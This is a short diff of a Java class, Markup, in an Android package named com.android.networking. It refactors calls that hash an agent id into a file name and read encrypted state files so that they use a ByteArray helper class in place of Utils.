@@ -17,7 +17,6 @@ import java.io.ObjectInputStream;
 import java.io.ObjectOutput;
 import java.io.ObjectOutputStream;
 import java.io.Serializable;
-import java.util.HashMap;
 
 import com.android.networking.auto.Cfg;
 import com.android.networking.crypto.CryptoException;
@@ -28,8 +27,8 @@ import com.android.networking.event.BaseEvent;
 import com.android.networking.file.AutoFile;
 import com.android.networking.file.Path;
 import com.android.networking.module.BaseModule;
+import com.android.networking.util.ByteArray;
 import com.android.networking.util.Check;
-import com.android.networking.util.Utils;
 
 
 /**
@@ -108,7 +107,7 @@ public class Markup {
 	 */
 	static String makeMarkupName(String agentId, final boolean addPath) {
 		// final String markupName = Integer.toHexString(agentId);
-		final String markupName = Utils.byteArrayToHex(Digest.SHA1(agentId.getBytes()));
+		final String markupName = ByteArray.byteArrayToHex(Digest.SHA1(agentId.getBytes()));
 		if (Cfg.DEBUG) {
 			Check.requires(markupName != null, "null markupName"); //$NON-NLS-1$
 		}
@@ -205,7 +204,7 @@ public class Markup {
 
 		if (fileRet.exists()) {
 			final byte[] encData = fileRet.read();
-			final int len = Utils.byteArrayToInt(encData, 0);
+			final int len = ByteArray.byteArrayToInt(encData, 0);
 
 			byte[] plain = null;
 			try {
@@ -236,12 +235,12 @@ public class Markup {
 	
 /*	public int readMarkupInt() throws IOException{
 		byte[] data = readMarkup();
-		int value = Utils.byteArrayToInt(data, 0);
+		int value = ByteArray.byteArrayToInt(data, 0);
 		return value;		
 	}
 	
 	public void writeMarkupInt(int value){
-		byte[] data = Utils.intToByteArray(value);
+		byte[] data = ByteArray.intToByteArray(value);
 		writeMarkup(data);
 	}*/
 
